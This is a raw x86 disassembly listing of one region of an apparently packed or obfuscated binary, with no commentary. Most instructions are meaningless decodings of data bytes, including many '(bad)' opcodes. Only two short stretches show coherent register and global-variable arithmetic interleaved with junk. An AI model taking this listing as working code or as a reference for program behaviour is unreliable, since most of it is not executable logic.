  409843:	inc    bp
  409845:	pop    DWORD PTR [eax+ecx*8-0x3479b2b5]
  40984c:	xchg   BYTE PTR [ebx-0x36],bh
  40984f:	inc    ecx
  409850:	push   edx
  409851:	sub    bl,BYTE PTR [esi-0x27]
  409854:	iret   
  409855:	dec    ecx
  409856:	jb     0x40987e
  409858:	not    DWORD PTR [edx-0x648f1d14]
  40985e:	cmp    bh,BYTE PTR [eax]
  409860:	xor    al,0x36
  409862:	fucomi st,st(5)
  409864:	xor    bh,dl
  409866:	sub    eax,0x21ff2f40
  40986b:	pushf  
  40986c:	das    
  40986d:	mov    ah,0xf0
  40986f:	add    bh,ch
  409871:	or     edi,eax
  409873:	hlt    
  409874:	lahf   
  409875:	mov    esp,0xc1559403
  40987a:	and    DWORD PTR ds:0xd1245d68,edi
  409880:	sahf   
  409881:	jecxz  0x4098c0
  409883:	cmp    eax,0xac7f1630
  409888:	push   ebp
  409889:	retf   
  40988a:	mov    dl,0x71
  40988c:	in     eax,dx
  40988d:	jb     0x409858
  40988f:	mov    bh,BYTE PTR [esi+0x78c0206c]
  409895:	dec    esp
  409896:	out    dx,al
  409897:	jle    0x4098ed
  409899:	push   edi
  40989a:	in     eax,0x24
  40989c:	push   eax
  40989d:	loopne 0x409847
  40989f:	stc    
  4098a0:	ficomp DWORD PTR [ebx-0x66a345bc]
  4098a6:	(bad)  
  4098a7:	in     eax,0x2a
  4098a9:	mov    cl,0x43
  4098ab:	adc    ebx,eax
  4098ad:	ret    
  4098ae:	fisubr DWORD PTR [ebx+0x4a]
  4098b1:	nop
  4098b2:	push   ss
  4098b3:	inc    esi
  4098b4:	aas    
  4098b5:	xchg   ebx,eax
  4098b6:	rol    BYTE PTR [ecx+0x29971e77],1
  4098bc:	xchg   DWORD PTR [edx],eax
  4098be:	mov    BYTE PTR [ebp-0x27f90d8],dh
  4098c4:	ds cdq 
  4098c6:	out    0xbb,al
  4098c8:	hlt    
  4098c9:	cmp    BYTE PTR [ebx+0x1211fe19],bl
  4098cf:	dec    edi
  4098d0:	jle    0x40988c
  4098d2:	ins    DWORD PTR es:[edi],dx
  4098d3:	sub    dh,BYTE PTR [ebx]
  4098d5:	mov    edi,0x404ede20
  4098da:	cmp    ecx,ecx
  4098dc:	into   
  4098dd:	outs   dx,BYTE PTR ds:[esi]
  4098de:	ss pop edi
  4098e0:	pusha  
  4098e1:	outs   dx,DWORD PTR ds:[esi]
  4098e2:	sbb    eax,0xa0125ba2
  4098e7:	ja     0x409901
  4098e9:	xor    DWORD PTR [ecx+0x52],esp
  4098ec:	push   eax
  4098ed:	jecxz  0x4098e4
  4098ef:	je     0x409889
  4098f1:	dec    esi
  4098f2:	mov    bl,0x62
  4098f4:	or     al,BYTE PTR ds:0x8b2594c8
  4098fa:	add    DWORD PTR [ecx+eiz*1],esi
  4098fd:	cmp    ah,BYTE PTR [edx]
  4098ff:	pop    ss
  409900:	cli    
  409901:	jns    0x409920
  409903:	sbb    esp,esi
  409905:	mov    edx,0x432012eb
  40990a:	sub    eax,0x8bcd9450
  40990f:	sub    DWORD PTR [edi],ebx
  409911:	ss add al,0x98
  409914:	xchg   esp,eax
  409915:	shl    BYTE PTR ds:0x3be58181,1
  40991b:	mov    edx,0xe8ef75bf
  409920:	fst    QWORD PTR [edi-0x61c4161d]
  409926:	ins    DWORD PTR es:[edi],dx
  409927:	sub    ebx,DWORD PTR [ebx+0x33]
  40992a:	fwait
  40992b:	inc    ecx
  40992c:	loope  0x409946
  40992e:	mov    dl,0xd8
  409930:	test   bl,ch
  409932:	xor    DWORD PTR [edx-0x7e3b8349],eax
  409938:	out    0x64,eax
  40993a:	test   DWORD PTR [esi+0x73fdecc8],0x5d2e3caf
  409944:	mov    BYTE PTR [ecx-0x49600899],dh
  40994a:	leave  
  40994b:	pop    ecx
  40994c:	pusha  
  40994d:	out    0x3c,al
  40994f:	fidiv  WORD PTR ds:0x759cc87b
  409955:	adc    eax,0xd5234a2a
  40995a:	sti    
  40995b:	aam    0x4c
  40995d:	push   esp
  40995f:	out    0xdb,al
  409961:	and    esp,DWORD PTR cs:[ecx]
  409964:	out    dx,al
  409965:	cmp    DWORD PTR ds:0x48e8981d,esp
  40996b:	stos   BYTE PTR es:[edi],al
  40996c:	jp     0x409954
  40996e:	and    eax,0x4a06efd0
  409973:	ins    DWORD PTR es:[edi],dx
  409974:	scas   eax,DWORD PTR es:[edi]
  409975:	loopne 0x4099c8
  409977:	pop    ebp
  409978:	frstor [ecx+0x22c9ccdf]
  40997e:	arpl   bx,bx
  409980:	and    BYTE PTR [eax-0x6159e96a],bh
  409986:	test   al,0xf1
  409988:	dec    esp
  409989:	and    ch,BYTE PTR [ebp+0x5e16ee85]
  40998f:	ror    DWORD PTR ds:0x3ede7a30,cl
  409995:	cwde   
  409996:	out    dx,eax
  409997:	dec    esi
  409998:	cmp    bh,al
  40999a:	jo     0x4099b6
  40999c:	cmp    al,0xbe
  40999e:	lahf   
  40999f:	pop    edi
  4099a0:	adc    DWORD PTR [edx+0x4a7ecc89],edi
  4099a6:	not    bl
  4099a8:	sti    
  4099a9:	dec    ecx
  4099aa:	dec    esp
  4099ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099ac:	xor    al,0x5a
  4099ae:	adc    eax,0x653c3de4
  4099b3:	fist   DWORD PTR ds:0x7a103e5e
  4099b9:	or     esi,DWORD PTR [esi+0x278c1f14]
  4099bf:	cmp    eax,0x61e1be1f
  4099c4:	int    0x51
  4099c6:	mov    DWORD PTR ds:0x42a875,edx
  4099cc:	push   ecx
  4099cd:	mov    eax,0x5a3fc9f
  4099d2:	mov    DWORD PTR ds:0x42a885,0x49fb
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a875,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a7f9,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a779
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx+0x41ec14cf]
  409a19:	xor    ebx,DWORD PTR [esp+ebx*2]
  409a1c:	mov    dh,0xf7
  409a1e:	js     0x409a98
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x409a28
  409a25:	adc    BYTE PTR [ecx],ah
  409a27:	or     al,0x1
  409a29:	and    BYTE PTR [ebp+edx*8+0x3b330434],al
  409a30:	icebp  
  409a31:	idiv   BYTE PTR [ebx+0x44726cad]
  409a37:	pushf  
  409a38:	mov    ds:0xf2b2032,al
  409a3d:	mov    ah,0x84
  409a3f:	push   ds
  409a40:	pop    ecx
  409a41:	and    esp,DWORD PTR [edx+0x12220ed4]
  409a47:	fisubr DWORD PTR [eax]
  409a49:	(bad)  
  409a4a:	int3   
  409a4b:	loopne 0x409abb
  409a4d:	inc    edi
  409a4e:	iret   
  409a4f:	adc    DWORD PTR [esi],0xffffff83
  409a52:	repnz in eax,0xfb
  409a55:	xor    BYTE PTR [edx+0x0],bh
  409a58:	or     al,0x2c
  409a5b:	out    0x9b,eax
  409a5d:	pusha  
  409a5e:	or     eax,0x9b11fe85
  409a63:	dec    esp
  409a64:	lahf   
  409a65:	jmp    DWORD PTR [edx+0x1f]
  409a68:	sahf   
  409a69:	push   ss
  409a6a:	stos   DWORD PTR es:[edi],eax
  409a6b:	mov    BYTE PTR [edx],cl
  409a6d:	inc    edi
  409a6e:	xor    DWORD PTR [esi],eax
  409a70:	adc    eax,ebp
  409a72:	jae    0x409a51
  409a74:	or     ch,BYTE PTR [ebp-0x1c]
  409a77:	jne    0x409a6b
  409a79:	add    BYTE PTR [eax],bl
  409a7b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  409a7d:	out    dx,al
  409a7e:	dec    edx
  409a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a80:	inc    ecx
  409a81:	cmp    edi,DWORD PTR [esi-0x2ffd2d9f]
  409a87:	jmp    DWORD PTR [edx+0x7a44b2d6]
  409a8d:	xchg   ebx,eax
  409a8e:	aaa    
  409a8f:	dec    eax
  409a90:	push   esp
  409a91:	xchg   DWORD PTR [eax+edi*8],ecx
  409a94:	push   edi
  409a95:	pop    ecx
  409a96:	sub    dh,BYTE PTR [ebx+0x5a]
  409a99:	push   ebp
  409a9a:	sub    BYTE PTR [edx],dh
  409a9c:	pop    esi
  409a9d:	xchg   ebp,eax
  409a9e:	sub    DWORD PTR [esi+0x2b],edi
  409aa1:	and    BYTE PTR [edi+0x35d8c140],cl
  409aa7:	(bad)  
  409aa8:	xlat   BYTE PTR ds:[ebx]
  409aa9:	fisttp QWORD PTR [eax+eiz*1+0x72636435]
  409ab0:	imul   dh
  409ab2:	ins    DWORD PTR es:[edi],dx
  409ab3:	(bad)  
  409ab4:	or     eax,0xb5c38344
  409ab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409aba:	cs cmp cl,ch
  409abd:	add    bl,BYTE PTR [ebx]
  409abf:	cmc    
  409ac0:	cmp    DWORD PTR [eax-0x12bba35e],eax
  409ac6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ac7:	repnz sbb BYTE PTR [edx-0x5a593935],ah
  409ace:	retf   0x8a6e
  409ad1:	lods   al,BYTE PTR ds:[esi]
  409ad2:	test   DWORD PTR [ecx+0x33e8c0af],ebx
  409ad8:	in     eax,dx
  409ad9:	mov    ch,0x3c
  409adc:	mov    esi,0xf1328c90
  409ae1:	outs   dx,BYTE PTR ds:[esi]
  409ae2:	lods   al,BYTE PTR ds:[esi]
  409ae3:	das    
  409ae4:	pop    edi
  409ae5:	inc    ecx
  409ae6:	mov    ecx,0xd637dfcb
  409aeb:	mov    eax,ds:0x1c97af9c
  409af0:	ret    
  409af1:	mov    al,ds:0x52cf4f69
  409af6:	jae    0x409b49
  409af8:	pop    eax
  409af9:	call   0xbd:0x41753e3c
  409b00:	into   
  409b01:	test   ebp,edi
  409b03:	push   esi
  409b04:	sar    DWORD PTR [ecx],1
  409b06:	fild   WORD PTR [eax]
  409b08:	sub    BYTE PTR [edx-0x7c],cl
  409b0b:	(bad)  
  409b0c:	xor    DWORD PTR [ebx+0x19],ecx
  409b0f:	loope  0x409b3a
  409b11:	pop    edi
  409b12:	add    DWORD PTR [ebp-0x5af35854],edx
  409b18:	in     al,dx
  409b19:	add    DWORD PTR [ebx-0x69],eax
  409b1c:	sbb    eax,0x1df8a9d1
  409b21:	pop    edi
  409b22:	in     al,0x14
  409b24:	test   al,0x4
  409b26:	pushf  
  409b27:	jno    0x409b94
  409b29:	js     0x409b4f
  409b2b:	add    bh,BYTE PTR [eax]
  409b2d:	cli    
  409b2e:	ss dec ecx
  409b30:	xor    BYTE PTR ds:[edx],bh
  409b33:	push   es
  409b34:	aad    0xc4
  409b36:	out    0xe4,al
  409b38:	xlat   BYTE PTR ds:[ebx]
  409b39:	int    0xc0
  409b3b:	je     0x409b74
  409b3d:	jnp    0x409b60
  409b3f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409b41:	sbb    eax,0xd47ef796
  409b46:	leave  
  409b47:	addr16 cmc 
  409b49:	dec    edx
  409b4a:	pushf  
  409b4b:	cmp    DWORD PTR [edx+edx*2+0x78],0x2304557e
  409b53:	nop
  409b54:	or     BYTE PTR [ebp+0x70a7dab0],ch
  409b5a:	lea    eax,[esi]
  409b5c:	xchg   ebp,eax
  409b5d:	mov    ch,0x98
  409b5f:	addr16 xchg esp,eax
  409b61:	call   0x7bc17a28
  409b66:	lds    esp,FWORD PTR [edi-0x60]
  409b69:	push   ss
  409b6a:	in     al,dx
  409b6b:	add    al,0xcd
  409b6d:	out    0x28,eax
  409b6f:	cs sbb cl,cl
  409b72:	mov    ebp,0x25919f8
  409b77:	std    
  409b78:	aaa    
  409b79:	test   BYTE PTR [eax+edx*8],cl
  409b7c:	in     eax,0x12
  409b7e:	xchg   edx,eax
  409b7f:	imul   ecx,DWORD PTR [esi+ecx*2-0x3f],0xdf40a185
  409b87:	out    0x5f,eax
  409b89:	(bad)  
  409b8a:	push   ebx
  409b8b:	mov    fs,WORD PTR [ebp+esi*2-0x58]
  409b8f:	imul   ebx,DWORD PTR [esi],0x4d4d2558
  409b95:	mov    eax,ds:0x58573873
  409b9a:	fistp  DWORD PTR [ecx]
  409b9c:	js     0x409b48
  409b9e:	and    DWORD PTR [ebp-0x5e],edx
  409ba1:	sbb    ch,BYTE PTR [eax+eiz*1]
  409ba4:	fiadd  DWORD PTR ds:[ebp-0x74d3f543]
  409bab:	std    
  409bac:	outs   dx,DWORD PTR ds:[esi]
  409bad:	ror    DWORD PTR [eax-0x59a3e688],cl
  409bb3:	lea    esp,[ebp+0x1d33e1c7]
  409bb9:	sub    al,0x70
  409bbb:	dec    BYTE PTR [eax+0x4c]
  409bbe:	push   ss
  409bbf:	xchg   esp,eax
  409bc0:	cmp    bl,BYTE PTR [esi-0x70c658b5]
  409bc6:	outs   dx,BYTE PTR ds:[esi]
  409bc7:	mov    esp,0x5ecfdc18
  409bcc:	adc    eax,0x646bcc77
  409bd1:	dec    ebx
  409bd2:	sub    eax,DWORD PTR [ebx+0x316d3d84]
  409bd8:	xor    bh,BYTE PTR [eax-0x3d]
  409bdb:	push   ebx
  409bdc:	repz adc DWORD PTR [ecx-0x35],0x6ba7282b
  409be4:	xchg   esp,eax
  409be5:	push   esp
  409be6:	repz mov WORD PTR ds:0xedad6d55,cs
  409bed:	adc    eax,0x2ff4d9d8
  409bf2:	stos   BYTE PTR es:[edi],al
  409bf3:	dec    ebp
  409bf4:	cld    
  409bf5:	mov    dl,dh
  409bf7:	into   
  409bf8:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  409bfa:	jnp    0x409bd5
  409bfc:	sar    BYTE PTR [ebx],1
  409bfe:	pop    ebp
  409bff:	adc    edx,esi
  409c01:	mov    ds:0x69f70284,eax
  409c06:	cmp    eax,DWORD PTR [eax-0x57c372d9]
  409c0c:	das    
  409c0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c0e:	cwde   
  409c0f:	popa   
  409c10:	loopne 0x409b95
  409c12:	out    dx,al
  409c13:	ja     0x409c3d
  409c15:	sbb    BYTE PTR [esi],al
  409c17:	push   ebx
  409c18:	jb     0x409c3e
  409c1a:	es cld 
  409c1c:	scas   al,BYTE PTR es:[edi]
  409c1d:	mov    dl,0x7f
  409c1f:	inc    BYTE PTR [ecx+0x21]
  409c22:	in     al,0xe8
  409c24:	popa   
  409c25:	enter  0x9f7,0x1
  409c29:	inc    ecx
  409c2a:	add    al,0x25
  409c2c:	mov    BYTE PTR [esi+eax*4+0x7d],dh
  409c30:	push   ebp
  409c31:	push   0xbe8520b9
  409c36:	js     0x409c34
  409c38:	mov    cs,WORD PTR [edx+edx*8+0x48]
  409c3c:	lahf   
  409c3d:	jl     0x409c4e
  409c3f:	stos   BYTE PTR es:[edi],al
  409c40:	cmp    al,0xc4
  409c42:	cmp    eax,0xb694655e
  409c47:	push   ds
  409c48:	out    0xa1,eax
  409c4a:	cmp    dh,BYTE PTR [edi]
  409c4c:	repnz inc esi
  409c4e:	inc    edi
  409c4f:	cdq    
  409c50:	dec    esi
  409c51:	retf   0xd7f3
  409c54:	push   ecx
  409c55:	mov    bh,0x9e
  409c57:	lds    ebx,FWORD PTR [esi+0x60f26c7b]
  409c5d:	cdq    
  409c5e:	mov    edx,0xd823b0c7
  409c63:	jl     0x409c68
  409c65:	in     al,0x22
  409c67:	mov    ah,0x2d
  409c69:	shl    BYTE PTR [esi-0x5d],1
  409c6c:	ret    
  409c6d:	cli    
  409c6e:	ins    DWORD PTR es:[edi],dx
  409c6f:	in     al,0x32
  409c71:	adc    BYTE PTR [eax+0x1e237f14],dh
  409c77:	cld    
  409c78:	retf   0xd7a8
  409c7b:	fs add ebp,esi
  409c7e:	cmp    esi,DWORD PTR [ecx]
  409c80:	mul    ebp
  409c82:	add    DWORD PTR [esi+0x477050b4],edi
  409c88:	call   0x21d4:0x433b630d
  409c8f:	inc    ecx
  409c90:	add    al,0x68
  409c92:	stos   BYTE PTR es:[edi],al
  409c93:	loop   0x409c35
  409c95:	dec    ebp
  409c96:	sub    BYTE PTR [edx-0x74c38990],ah
  409c9c:	push   0x59
  409c9e:	jg     0x409c39
  409ca0:	dec    ebx
  409ca1:	inc    eax
  409ca2:	int3   
  409ca3:	inc    ebp
  409ca4:	fisttp DWORD PTR [ebx+0x75]
  409ca7:	or     eax,0xd2f77950
  409cac:	mov    eax,0x405dc2f2
  409cb1:	test   esp,eax
  409cb3:	cmp    DWORD PTR [ebp+esi*8-0x2d],0x8edfe03
  409cbb:	scas   al,BYTE PTR es:[edi]
  409cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cbd:	push   cs
  409cbe:	loopne 0x409d07
  409cc0:	rcl    BYTE PTR [edi+eax*2],cl
  409cc3:	idiv   BYTE PTR [esi-0x29]
  409cc6:	adc    BYTE PTR [eax],ch
  409cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cc9:	inc    esp
  409cca:	add    ch,BYTE PTR [ecx-0x79]
  409ccd:	icebp  
  409cce:	lahf   
  409ccf:	stc    
  409cd0:	hlt    
  409cd1:	jbe    0x409d00
  409cd3:	(bad)  
  409cd4:	(bad)  
  409cd5:	jle    0x409c9d
  409cd7:	jnp    0x409d27
  409cd9:	std    
  409cda:	pop    ecx
  409cdb:	cmp    cl,ah
  409cdd:	dec    edx
  409cde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cdf:	aaa    
  409ce0:	pop    es
  409ce1:	lods   eax,DWORD PTR ds:[esi]
  409ce2:	mov    eax,ds:0xe9a44c0d
  409ce7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ce8:	mov    esi,0x4e10c664
  409ced:	std    
  409cee:	inc    edx
  409cef:	and    BYTE PTR [edi+0x62],dh
  409cf2:	scas   eax,DWORD PTR es:[edi]
  409cf3:	sbb    BYTE PTR [edx+0x563805db],bh
  409cf9:	jno    0x409d61
  409cfb:	mov    eax,DWORD PTR [ebp-0x8]
  409cfe:	sbb    DWORD PTR ds:0x42a779,0x42a805
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a77d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a841,0x42a83d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a831,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi+0x4e0867da],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409dc0
  409d66:	(bad)  
  409d67:	sar    bh,1
  409d69:	adc    BYTE PTR [esp+ecx*8-0x3814bcd6],0xce
  409d71:	pop    edi
  409d72:	outs   dx,BYTE PTR ds:[esi]
  409d73:	sbb    al,0x9a
  409d75:	push   edi
  409d76:	das    
  409d77:	rcl    DWORD PTR [ebp+esi*1+0x2606902d],cl
  409d7e:	mov    esp,ds
  409d80:	test   DWORD PTR [eax-0x3a],eax
  409d83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d84:	xchg   ebp,eax
  409d85:	sahf   
  409d86:	fdivp  st(3),st
  409d88:	enter  0x1719,0x96
  409d8c:	scas   eax,DWORD PTR es:[edi]
  409d8d:	clzero 
  409d90:	ror    DWORD PTR [eiz*2+0x79f98328],1
  409d97:	pushf  
  409d98:	sar    BYTE PTR ds:0xae849bdc,0x5e
  409d9f:	fisub  DWORD PTR ds:0x44512302
  409da5:	out    dx,eax
  409da6:	or     DWORD PTR [esi-0x52],edi
  409da9:	shl    edi,1
  409dab:	gs pusha 
  409dad:	(bad)  
  409dae:	mov    bh,bh
  409db0:	jo     0x409e0d
  409db2:	dec    ebp
  409db3:	mov    ebx,0x9dc5efde
  409db8:	sar    BYTE PTR [edx+0x77aa09d6],cl
  409dbe:	jg     0x409dd7
  409dc0:	jo     0x409d53
  409dc2:	ins    DWORD PTR es:[edi],dx
  409dc3:	pop    es
  409dc4:	mov    ebp,0x58fdbfa3
  409dc9:	test   al,0x9e
  409dcb:	gs push ss
  409dcd:	jl     0x409d96
  409dcf:	addr16 sub eax,0xee9fbc13
  409dd5:	jg     0x409d70
  409dd7:	ds addr16 mov esi,0x8d7e057
  409dde:	add    al,0xf3
  409de0:	mov    edx,0xa239ca7c
  409de5:	or     eax,0x9eaab591
  409dea:	lea    ecx,[edi]
  409dec:	mov    esi,0x7930f434
  409df1:	mov    ebp,0xed42b4cb
  409df6:	sub    DWORD PTR [ecx-0x3ffee269],0x1
  409dfd:	jno    0x409d81
  409dff:	lods   al,BYTE PTR ds:[esi]
  409e00:	test   eax,0x97212fb9
  409e05:	out    dx,eax
  409e06:	inc    ebp
  409e07:	in     eax,0x1d
  409e09:	addr16 ret 
  409e0b:	pop    ebp
  409e0c:	sub    esi,DWORD PTR [edi+0x251fca68]
  409e12:	sub    DWORD PTR ds:0xec52a44a,ebx
  409e18:	call   0x549c2b90
  409e1d:	int    0xc5
  409e1f:	mov    eax,ds:0x744c90e
  409e24:	cmp    eax,0x8218e7e4
  409e29:	xor    edx,DWORD PTR [ebp+0x528592b0]
  409e2f:	push   edx
  409e30:	xchg   edx,eax
  409e31:	xor    edi,ebx
  409e33:	push   0xeed6af42
  409e38:	bound  ecx,QWORD PTR [edx+edi*1]
  409e3b:	jns    0x409eb9
  409e3d:	push   edi
  409e3e:	add    DWORD PTR [di-0x42],edi
  409e42:	pusha  
  409e43:	in     eax,dx
  409e44:	sti    
  409e45:	clc    
  409e46:	pop    eax
  409e47:	imul   ebp,DWORD PTR es:[esi],0x1c
  409e4b:	jbe    0x409e67
  409e4d:	and    bh,BYTE PTR [esi-0x53]
  409e50:	sbb    BYTE PTR [eax+0x2a],bh
  409e53:	(bad)  
  409e54:	jns    0x409e9b
  409e56:	das    
  409e57:	jb     0x409ec8
  409e59:	loope  0x409e7e
  409e5b:	pop    ebx
  409e5c:	iret   
  409e5d:	adc    edi,DWORD PTR [esi+ebp*4]
  409e60:	pop    edi
  409e61:	xor    al,0xa3
  409e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e64:	(bad)  
  409e66:	out    0xe,al
  409e68:	or     BYTE PTR [ebx+0x3aedfa86],0xcf
  409e6f:	sub    esi,ecx
  409e71:	mov    al,ds:0x5e47d383
  409e76:	push   ebp
  409e77:	dec    ebp
  409e78:	mov    WORD PTR [esi+edi*2],gs
  409e7b:	enter  0x3947,0xfd
  409e7f:	call   0x625d2f33
  409e84:	inc    ebp
  409e85:	jmp    0x9867:0xc25e042e
  409e8c:	pop    ebx
  409e8d:	add    eax,0x50f61f50
  409e92:	mov    BYTE PTR [ebx+eiz*8],ch
  409e95:	test   DWORD PTR [ebx+0x1fbe5743],0x11b00a94
  409e9f:	xchg   ebp,eax
  409ea0:	cvtps2pd xmm7,QWORD PTR [eax]
  409ea3:	fmul   st,st(2)
  409ea5:	lds    ebx,FWORD PTR [ecx-0x7c]
  409ea8:	add    ecx,ebx
  409eaa:	inc    eax
  409eab:	xchg   ebp,eax
  409eac:	inc    ecx
  409ead:	push   es
  409eae:	(bad)  
  409eaf:	outs   dx,BYTE PTR ds:[esi]
  409eb0:	outs   dx,DWORD PTR ds:[esi]
  409eb1:	call   DWORD PTR [eax-0x7b89c66a]
  409eb7:	shl    BYTE PTR [edi],1
  409eb9:	or     eax,0x968409eb
  409ebe:	xlat   BYTE PTR ds:[ebx]
  409ebf:	cmp    BYTE PTR [edi-0x17],bh
  409ec2:	pop    ss
  409ec3:	sub    BYTE PTR [eax+0x434660be],ah
  409ec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eca:	dec    edi
  409ecb:	mov    al,0xb4
  409ecd:	rcl    cl,1
  409ecf:	sbb    ecx,0xffffff9d
  409ed2:	les    esp,FWORD PTR [edx*4-0x57c5ca20]
  409ed9:	sub    eax,DWORD PTR [edi-0x5a]
  409edc:	xlat   BYTE PTR ds:[ebx]
  409edd:	out    dx,eax
  409ede:	inc    eax
  409edf:	or     eax,0x71e6f9ee
  409ee4:	or     eax,0x25ece32c
  409ee9:	loopne 0x409ef8
  409eeb:	pusha  
  409eec:	push   esi
  409eed:	mov    ecx,0x1a19c677
  409ef2:	mov    ds,WORD PTR [edx]
  409ef4:	adc    al,0x2a
  409ef6:	mov    ah,0xfc
  409ef8:	inc    ebx
  409ef9:	pop    esi
  409efa:	xor    al,0xaf
  409efc:	cli    
  409efd:	xor    eax,0x57cbad4c
  409f02:	push   0x39
  409f04:	aas    
  409f05:	pushf  
  409f06:	mov    al,ds:0x53ddd28c
  409f0b:	aam    0xa8
  409f0d:	es push ecx
  409f0f:	ds cwde 
  409f11:	mov    al,0x2e
  409f13:	dec    ebp
  409f14:	add    al,0xd
  409f16:	mov    al,ds:0xa0f0c89c
  409f1b:	or     bh,BYTE PTR [ebx+ecx*4-0x42]
  409f1f:	outs   dx,DWORD PTR ds:[esi]
  409f20:	das    
  409f21:	arpl   WORD PTR [edi-0x63],bp
  409f24:	mov    ebx,0x129d5d69
  409f29:	stos   DWORD PTR es:[edi],eax
  409f2a:	mov    dl,0xb4
  409f2c:	push   ebx
  409f2d:	loopne 0x409f38
  409f2f:	test   al,0x44
  409f31:	test   DWORD PTR [ebp-0x1c3a4be6],esp
  409f37:	pop    edi
  409f38:	test   ebp,ebx
  409f3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f3b:	lods   eax,DWORD PTR ds:[esi]
  409f3c:	sbb    ebx,DWORD PTR ds:0x3c181999
  409f42:	bound  ebx,QWORD PTR [edx-0x21]
  409f45:	dec    ebp
  409f46:	jns    0x409f63
  409f48:	pop    eax
  409f49:	sbb    DWORD PTR [edx-0x52229141],ebp
  409f4f:	in     eax,dx
  409f50:	stos   DWORD PTR es:[edi],eax
  409f51:	jbe    0x409f5c
  409f53:	or     esp,DWORD PTR ds:0xa3e29d6c
  409f59:	sbb    al,0xd5
  409f5b:	ins    BYTE PTR es:[edi],dx
  409f5c:	imul   edi,DWORD PTR [ebx+0x55],0xa383cf4d
  409f63:	push   ebp
  409f64:	lds    ebp,FWORD PTR [edx]
  409f66:	sub    edx,edx
  409f68:	inc    ebp
  409f69:	xor    DWORD PTR [esi],edi
  409f6b:	dec    eax
  409f6c:	pop    edx
  409f6d:	xchg   edx,eax
  409f6e:	ins    DWORD PTR es:[edi],dx
  409f6f:	push   ecx
  409f70:	dec    ebx
  409f71:	lahf   
  409f72:	jb     0x409fd8
  409f74:	imul   esp,DWORD PTR [esi-0x5a1b58c3],0xffffffc9
  409f7b:	add    BYTE PTR [esi+0x7a],0x7a
  409f7f:	fdivr  st(1),st
  409f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f82:	mov    ebx,0x7702b46e
  409f87:	stc    
  409f88:	fdiv   QWORD PTR [esi+ebp*2-0xf852be1]
  409f8f:	mov    ebp,0xbd1adedc
  409f94:	dec    esi
  409f95:	mov    edx,0x2675e71e
  409f9a:	push   es
  409f9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f9c:	mov    ecx,0x48b23f8c
  409fa1:	xchg   esp,eax
  409fa2:	out    dx,al
  409fa3:	xlat   BYTE PTR ds:[ebx]
  409fa4:	dec    eax
  409fa5:	ret    0x30a
  409fa8:	add    esi,DWORD PTR [edx+0x2199e14b]
  409fae:	ror    edi,0x36
  409fb1:	adc    ah,BYTE PTR [eax]
  409fb3:	daa    
  409fb4:	shr    ch,1
  409fb6:	push   ds
  409fb7:	(bad)
  409fbb:	hlt    
  409fbc:	push   ebp
  409fbd:	push   es
  409fbe:	sub    ecx,DWORD PTR [eax+0x79]
  409fc1:	push   esi
  409fc2:	retf   0xe9cd
  409fc5:	push   ebp
  409fc6:	inc    ebx
  409fc7:	(bad)  
  409fc9:	scas   eax,DWORD PTR es:[edi]
  409fca:	loope  0x40a032
  409fcc:	ins    DWORD PTR es:[edi],dx
  409fcd:	stos   DWORD PTR es:[edi],eax
  409fce:	add    al,0xb0
  409fd0:	cmp    bh,cl
  409fd2:	adc    al,0x77
  409fd4:	pusha  
  409fd5:	scas   al,BYTE PTR es:[edi]
  409fd6:	ffreep st(4)
  409fd8:	pusha  
  409fd9:	xor    al,0xb9
  409fdb:	pop    ds
  409fdc:	or     al,0x30
  409fde:	jecxz  0x409f82
  409fe0:	cdq    
  409fe1:	push   esp
  409fe2:	leave  
  409fe3:	xorps  xmm1,XMMWORD PTR ds:0x27150b9f
  409fea:	stc    
  409feb:	int3   
  409fec:	inc    esi
  409fed:	(bad)  
  409fee:	in     eax,dx
  409fef:	sub    esi,DWORD PTR [esi+0x56]
  409ff2:	or     ah,BYTE PTR [ebx+eax*1+0xc]
  409ff6:	ret    
